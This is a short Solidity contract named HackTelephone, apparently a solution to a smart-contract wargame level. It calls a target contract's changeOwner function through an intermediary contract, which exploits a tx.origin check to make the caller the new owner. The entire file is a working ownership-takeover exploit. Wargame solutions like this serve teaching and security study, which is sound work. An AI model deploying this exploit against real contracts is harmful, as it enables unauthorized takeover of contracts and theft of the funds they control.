// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelePhone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _targetContract) public {
    ITelePhone(_targetContract).changeOwner(msg.sender);
  }
}